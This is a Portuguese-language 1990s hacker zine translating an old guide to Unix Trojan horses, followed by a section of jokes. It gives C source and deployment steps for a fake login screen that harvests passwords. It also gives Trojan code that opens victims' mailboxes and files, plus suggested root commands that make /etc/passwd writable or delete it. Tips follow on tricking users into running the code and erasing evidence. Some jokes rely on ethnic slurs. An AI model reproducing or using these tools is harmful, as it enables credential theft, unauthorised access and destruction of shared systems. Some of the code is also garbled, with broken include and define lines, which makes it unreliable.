@@ -1,0 +1,441 @@
+      ||||||||      ||||||||||    ||                ||
+      |       |     |        |     ||              ||
+      |        |    |        |      ||            ||
+      |         |   |        |       ||          ||
+      |        |    |        |        ||        ||
+      |       |     |        |         ||      ||
+      ||||||||      ||||||||||          ||||||||
+     
+********************************************************
+O ZINE da Gabscape http://www.geocities.com/Baja/5153
+********************************************************
+                   LEIA COM ATENÇÃO :
+Esse zine não é responsavilidade minha(Gabriel Dov),
+pois escrevi ele com intenções educativas apenas e se
+alguem fizer uso indevido das informações aqui contidas,
+essa pessoa é totalmente responsável pelo seu ato.
+********************************************************
+Fala pessoal !!
+Saiu a segunda edição do Gabscape Zine, o DOV !!
+Esse aqui ta demais !!!
+Mas como tudo que escrevo tem de ser perfeito, tá meio 
+grande!!!
+Chega de BlaBLABLA e vamos ao que interessa !!
+
+********************************************************
+Índice:
+
+1. Cavalos de tróia em UNIX
+2. Humor
+
+
+***************1.Cavalos de tróia em UNIX***************
+Introducao
+------------
+
+     "Seguranca UNIX" eh uma coisa que nao se entende.  E' um sistema facil de se tentar
+um login com forca bruta (muitos sistemas UNIX nao desligam depois de x
+tentativas de login, e existe uma quantidade enorme de logins default,
+tal como root, bin, sys and uucp).  Uma vez que vc esta no sistemas, voce
+pode facilmente deixa-lo aos seus pes, ou, se voce conhece um pouco de 'C',
+voce pode fazer o sistema trabalhar para voce e totalmente eliminar as
+barreiras de seguranca criando logins, lendo arquivos de qualquer um, etc.
+Esse arquivo ira mostrar varias formas de se fazer isso usando a linguagem
+'C' que voce implementa em UNIX!
+
+Requirimentos
+------------
+     Voce precisa de uma conta em um sistema UNIX.  Este pode ser em uma 
+versao robusta do UNIX (tal como 4.2bsd ou AT&T System V) rodando em uma
+maquina em tempo real (um PDP/11, VAX, Pyramid, etc.) para resultados
+melhores.  Se voce estiver na escola e tem uma conta no sistema da escola,
+entao sera perfeito!
+
+Notas
+-----
+     Esse arquivo foi inspirado no artigo de Abril de 86 da Byte
+(versao americana) entitulado "Deixando UNIX Seguro."  No artigo, os autores
+dissem "Nos damos essa informacao de uma forma que, assim esperamos, seja
+interessante e util sem se tornar um 'livro de receitas para crackers'.  Nos
+temos, portanto, omitido detalhes." Eu estou agora mostrando os metodos gerais,
+fora do artigo, dando exemplos explicitos do metodo que ele falaram.
+
+La vamos nos... Segura Peao...
+
+Primeiro Projeto:  Pescaria de senhas
+-----------------------------------
+
+     Voce podera implementar esse exemplo tendo um minimo de conhecimento de UNIX e
+C.  Entretanto, voce precisa de acesso para um terminal que muitas pessoas usam -
+o computador no laboratorio da sua escola, por exemplo.
+
+     Quando voce entra em um Sistema UNIX tipico, voce ve algo como isso:
+
+Tiburon Systems 4.2bsd / System V (shark)
+
+
+login: shark
+Password:      (nao aparece)
+
+     O programa que eu estou mostrando aqui simula uma sequencia de logon. Voce
+roda o programa de um terminal e sai.  Algum idiota que nao sabe disso
+ira usar esse terminal e entrar o login e o password.  Ele e escrito para um arquivo
+seu, e na tela aparece "login incorrect", entao o idiota tem que entrar login e senha
+denovo.  A segunda vez e o login real do sistema.
+Desta vez ele consegue entra no sistema.
+
+     No sistema, coloque o codigo seguinte dentro de um arquivo chamado 'horse.c'.
+Voce precisa modificar as primeiras 8 linhas para se assemelhar com o login do seu sistema.
+
+
+----- Codigo comeca aqui -----
+
+/* this is what a 'C' comment looks like.  You can leave them out. */
+
+/* define's are like macros you can use for configuration. */
+
+define SYSTEM "\n\nTiburon Systems 4.2bsd UNIX (shark)\n\n"
+
+/* A mensagem acima deve ser alterada para se parecer com a mensagem
+ * que o sistema imprime quando pronto.  Cada \n representa um carriage return
+ */
+
+define LOGIN  "login: "
+
+/* Obviamente esse ai de cima e o prompt do login.  Voce provavelmente nao tera que 
+ * altera-lo, ao menos que voce esteja rodando alguma versao diferente de UNIX!
+ */
+
+define PASSWORD "password:"
+
+/* Prompt da senha.  Voce pode altera-lo, se quiser
+ * e claro!
+ */
+
+define WAIT 2
+
+/* O valor numerico dado a WAIT e o delay que voce tem depois de 
+ * "password:" e antes de"login incorrect."  Altere ele (0 = quase sem 
+ * delay, 5 = LONGO delay) assim ele se parecera com o delay do seu sistema.
+ * realismo e a chave aqui - nos nao queremos que o seu alvo fique desconfiado!
+ */
+
+
+define INCORRECT "Login incorrect.\n"
+
+/* Altere a mensagem acima para a mensagem quando vc erra a senha!
+ */
+
+define FILENAME "stuff"
+
+/* FILENAME e o nome do arquivo com os passwords hackeados
+ * 'stuff' e um nome perfeito.
+ */
+
+/* NAO ALTERE O RESTO DO PROGRAMA A MENOS QUE VOCE SAIBA O QUE ESTA FAZENDO
+ * EM 'C'
+ */
+
+include 
+include 
+int stop();
+
+main()
+{
+char name[10], password[10];
+int i;
+FILE *fp, *fopen();
+signal(SIGINT,stop);
+initscr();
+printf(SYSTEM);
+printf(LOGIN);
+scanf("%[^\n]",name);
+getchar();
+noecho();
+printf(PASSWORD);
+scanf("%[^\n]",password);
+printf("\n");
+getchar();
+echo();
+sleep(WAIT);
+
+
+if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
+fprintf(fp,"login %s has password %s\n",name,password);
+fclose(fp);
+}
+
+printf(INCORRECT);
+endwin();
+}
+
+stop()
+{
+endwin();
+exit(0);
+}
+
+
+----- fonte acaba aqui -----
+
+     OK, como eu disse, faca o codigo acima e configure ele, assim ele parecera
+exatamente como a sequencia de login do seu sistema.  Para compila esse programa
+chamado 'horse.c' digite as seguinte duas linhas: (menos o %, eles sao apenas um
+prompt de exemplo)
+
+% cc horse.c -lcurses -ltermcap
+% mv a.out horse
+
+Voce agora possui o objeto de trabalho em um arquivo chamado 'horse'.  execute ele,
+e se ele nao se parece com a sequencia de logon do seu sistema, reedit 'horse.c'
+e re-compile ele.  Quando voce estiver pronto para colocar o programa em uso, crie
+um arquivo novo e chame-o 'trap' ou algo parecido.  'trap' deve ter esses dois
+commandos:
+
+horse                    (roda o programa)
+login                    (roda a sequencia de login)
+
+para executar 'trap' digite:
+
+% source trap            (novamente, nao digite o %)
+
+e va fazer um lanche...
+
+Depois de vc ter rodado esse programa algumas vezes, cheque seu arquivo
+chamado 'stuff' (ou qualquer coisa que vc tenha dado o nome a ele).  ele vai
+estar mais ou menos assim:
+
+user john has password secret
+user mary has password smegma
+etc.
+
+Agora copie esses passwords, e depois delete esse arquivo (ele pode ser MUITO
+incriminante se o root ve ele).
+
+-----
+
+Os proximos projetos podem rodar em um sistema remoto, tal como VAX em
+Michigan que voce tenha senhas, ou no sistema UNIX em Dartmouth, ou em qualquer
+lugar.
+Entretanto, eles requirem um pequeno conhecimento de 'C'.  Eles nao sao exatamente
+para novatos em UNIX.
+
+Projeto dois:  Ler arquivos de qualquer ums
+-------------------------------------
+
+Quando alguem roda um programa, eles sao os donos do processo criado
+e o programa pode fazer qualquer coisa que eles quiserem, tal como deletar
+um arquivo em seu diretorio ou fazer um arquivo disponivel para ser lido
+por qualquer um.
+
+Quando alguem salva e-mail antigo eles o fazem em um sistema UNIX, ele e
+colocado em um arquivo chamado mbox no diretorio home deles.  Pode ser
+engracado ler esse arquivo mas geralmente e impossivel para qualquer um a nao
+ser para o dono do arquivo.  Entao ai vai um programa que destranca esse arquivo.
+
+----- Codigo comeca aqui -----
+
+include 
+
+struct passwd *getpwnam(name);
+struct passwd *p;
+char buf[255];
+
+main()
+{
+p = getpwnam(getlogin());
+sprintf(buf,"%s/%s",p->pw_dir,"mbox");
+if ( access(buf,0) > -1 ) {
+        sprintf(buf,"chmod 777 %s/%s",p->pw_dir,"mbox");
+        system(buf);
+        }
+}
+
+----- Codigo termina aqui -----
+
+Assim, a questao e: Como fazer o meu alvo rodar esse programa que esta em
+diretorio?
+
+Se o sistema que voce esta possuir um programa de armazenamento de mensagens 
+publicas (em 4.xbsd, digite 'msgs') voce pode falar sobre seu programa aqui.  
+Coloque o codigo acima em outro programa - encontre um utilitario ou jogo em
+alguma revista como a UNIX WORLD (nao sei se tem no Brasil, em todos os casos
+o nome ta ai) de modo a executar o codigo acima no programa da revista.
+Assim se voce tiver um programa chamado tic-tac-toe (algo como jogo da velha)
+e se voce o modifica-lo para destravar o arquivo mbox do usuario antes dele 
+comecar o jogo da velha entao voce podera disser a ele que voce tem um jogo da
+velha e quer que ele teste dissendo que ele esta em seu diretorio.
+Se voce nao quiser que todos venham a jogar esse jogo, entao apenas envie um
+mail para a pessoa especifica.
+
+Se voce nao encontrar um arquivo para modificar, ento pegue o codigo seguinte
+e acrescente ele entre os dois '}' no fim do programa:
+
+printf("Error opening tic-tac-toe data file.  Sorry!\n");
+
+quando o programa rodar, ele ira imprimir a messagem de erro acima. O usuario
+ira pensar "Eh, aquele cara nao sabe nada de programacao!" mas somente o truke
+nele - agora voce pode ler seu e-mail.
+
+Se existe algum arquivo especifico em um diretorio de usuario que voce queira
+ler (digamos que seja "secret") apenas faca esse programa:
+
+main()
+{
+if ( access("secret",0) > -1 ) system("chmod 777 secret");
+}
+
+Entao 'talk' ou 'write' para ele e aja feito um panaca: "Eu fiz um programa chamado
+super_star_wars, voce quer experimentar ele?"
+
+Voce pode usar a sua imaginacao.  Pense em um comando que voce gostaria que alguem 
+executasse-o.  Entao coloque ele dentro de um system() call em um programa em C 
+e bote-o a rodar.
+
+Aqui vai uma ideia otima de usar a tecnica acima:
+
+Segundo Projeto: Ser o root (superusuario)
+-----------------------------------
+
+Faca um programa onde vc possa fazer as pessoas executa-lo.  Coloque essa linha
+em algum lugar:
+
+if ( !strcmp(getlogin(),"root") ) system("whatever you want");
+
+Isso checa se o login root esta rodando seu programa.  Se ele esta, voce podera
+fazer ele executar qualquer comando em Shell que voce quiser.
+Aqui vao algumas sugestoes:
+
+"chmod 666 /etc/passwd"
+
+     /etc/passwd e o arquivo com senhas do sistema.  O root possui esse 
+arquivo.  Normalmente, qualquer um pode ler ele (as senhas estao criptografadas)
+(em algums sistemas elas estao criptografadas E escondidas) mas somente o root
+pode escrever para esse arquivo.  De uma olhada e veja como esta formatado se voce 
+nao conhece isso ainda.  Esse comando permite voce escrever para esse comando
+- e portanto criar ilimitadas contas para voce e para seus amigos.
+
+
+"chmod 666 /etc/group"
+
+     Acrescentando voce para alguns grupo de high-access permite a voce abrir muitas 
+portas.
+
+"chmod 666 /usr/lib/uucp/L.sys"
+
+     Procure esse arquivo em seu sistema se esta na rede uucp.  Ele 
+contem dialups e passwords para outros sistemas na rede, e normalmente
+apenas o administrador de uucp pode le-lo.  Encontre quem possui esse arquivo
+e diga para ele executar, sem saber obvio, o programa que destrava esse programa para voce.
+
+"rm /etc/passwd"
+
+     Se voce fizer o root executar esse comando, o arquivo com as senhas sera removido
+e o sistema sera paralisado por um bom tempo. Esse comando e altamente destrutivo.
+
+-----
+
+Se voce for acrescentar um cavalo de Troia  ao seus sistema, existem algumas
+regras que voce deve seguir.  Se o seu projeto secreto for algo grande
+(tal como destravar o mbox do usuario ou deletar todas os seus arquivos ou algo 
+assim) esse programa nao podera ser um programa que as pessoas vao rodar muito
+(tal como um jogo de computador popular) - uma vez que as pessoas descobrirem 
+que os arquivos delas sao de acesso publico, a fonte do problemas sera descoberto
+rapidamente.  Salve esse projeto para um programa 'test' (bem como o jogo que
+voce esta fazendo para o projeto) que voce pedira a pessoas individualmente
+para rodar via mail ou 'talkING' com elas.  Como eu disse, esse programa 'teste'
+pode bombear ou imprimir uma messagem de erro depois de completa a sua missao,
+e entao voce ira falar a pessoa "Bem, eu acho que isso preciso de mais trabalho",
+espere ate eles sairem da rede, e entao leia qualquer arquivo que voce destravou.
+Se o seu programa de cavalo de troia tiver a missao de pegar um especifico usuario
+executando a si proprio - tal como o root ou outro usuario poderoso - voce pode
+por o codigo para fazer isso em um programa que ira rodar um monte de vezes
+por usuarios do sistema, seu codigo ira ficar dormente ate ele rodar ele.
+Se voce nao encontrar o codigo fonte para 'star trek' ou qualquer coisa em C,
+apenas aprenda C e converta algo do pascal. Isso nao sera prejudicial pois C e
+uma grande linguagem.  Aqui so foi mostrado o que isso pode fazer em um sistema 
+UNIX. Uma vez que voce pegou o root (pode modificar o arquivo /etc/passwd) remova
+o codigo incriminante do seu cavalo de Troia e voce nunca sera pego.
+
+E isso... Se voce tiver alguma questao ou comentario ou se voce simplesmente quiser
+me chamar de algum tipo de animal rastejante, chame esse sistema:
+
+The Matrix
+415/922-2008
+101 megs, IBM warezzz, 2400 baud, Phrack sub-board, etc.
+
+Lord British, I *dare* you to call.
+
+(>
+=========================================================================
+        PS.: O Tradutor e apenas um servo que aprecia a divulgacao de Ideias, ele pode
+ser considerado um hacker ou um cracker, ou algo ruim como um lammer, mas que
+ele entende bem de Ingles isso e verdade. :-)
+        Na verdade esse texto pode ser muito instrutivo nao so em hackear um sistema
+UNIX, como tambem levar a ideia desses projetos para outro sistema em outra
+linguagem, imagina por exemplo uma funcao em JAVA que pede pela senha do usuario para
+checar o e-mail e depois o programa a envia ao usuario via CGI ou e-mail ou qualquer 
+outra coisa.
+        Existem infinitas possibilidades de se hackear um sistema, eu so espero poder relatar
+as coisas sem que ninguem me chame de algum tipo de animal rastejante!
+        Antes que eu me esqueca, esse texto tem como fim o educativo, e portanto
+o autor nem o tradutor sao culpados por alguma besteira que o usuario possa fazer
+
+**************************HUMOR*************************
+- Minha filha Maricota ,de nove anos ,ganhou uma bolsa de estudos para ficar cinco anos na Europa ! 
+- Parabéns !Que ela estuda ? 
+- Saxofone ! 
+- Quem deu a bolsa ?O governo ? 
+- Não...os vizinhos ! 
+********************************************************
+O jovem chegou timidamente até o pai da moça e pediu : 
+- Seu Chiquinho... eu queria a mão de sua filha!
+- Muito Bem !Todos nós concordamos.Quero saber se o pretendente tem condições de sustentar uma família ! 
+- Lógico , Sr. Chiquinho ... se não ,nem viria aqui ! 
+- Maravilhoso! Somos onze ,esta bem ? 
+********************************************************
+Mãe: 
+- Ernestinho ,por que você comeu o pudim que estava na geladeira ? 
+Filho: 
+- Eu,mãe?Tem certeza ? 
+Mãe: 
+- Tenho !Sei que foi você !
+Filho: 
+- Como prova que fui eu , se eu peguei escondido ? 
+********************************************************
+O Cardoso começou contando uma piada para os amigos : 
+- Haviam dois portugueses burros,completamente idiotas, um... 
+- Espere , Cardoso.Sou portugues legítimo e não admito piada de portugues.Ouviu ? 
+-Ora...é apenas uma brincadeira...vou contar... 
+-Se contar ,vai quebrar o maió pau... !
+Cardoso pensou um pouco e começou: 
+-Haviam dois japoneses burros, completamente idiotas, um chamado Joaquim e outro Manoel... 
+********************************************************
+Os bombeiros chegaram ao hospício e não viram fogo algum !
+- Quem chamou os bombeiros ? 
+Um louco , conhecido por seu pseudônimo - Nero, se apresentou: 
+- Fui eu... 
+- Onde esta o fogo ? 
+- Os senhores chegaram muito depressa...nem deu tempo de acender 
+os fósforos !!! 
+********************************************************
+Três caras se perdem na selva amazônica e vão parar numa tribo de índios, que supõem nunca ter visto homem branco.Morrendo de medo, eles tentam se comunicar falando do jeito que imaginam que os índios falariam: 
+- Mim, mé-di-co! - diz o primeiro. 
+- Mim, bo-tâ-ni-co! - diz o segundo. 
+- Mim, cô-mi-co! - diz o terceiro. 
+E o índio: 
+- Se vocês médi cú, bota ni cú e comi cú, mim salva cú ! - Diz o índio, caido fora. 
+********************************************************
+
+OK Pessoal, é isso aí !!
+Minha mão ja ta caindo aqui !
+Mas tenho de adiantar o trabalho !
+Vamos para o próximo !
+
+DOV Gabscape Zine é ©Copyright de Gabriel DOV
+gabrieldov -- gabrieldov@geocities.com
+Gabscape -- http://www.geocities.com/Baja/5153
+
+                    Gabscape
+        "O seu guia para hackear a internet"
+         http://www.geocities.com/Baja/5153
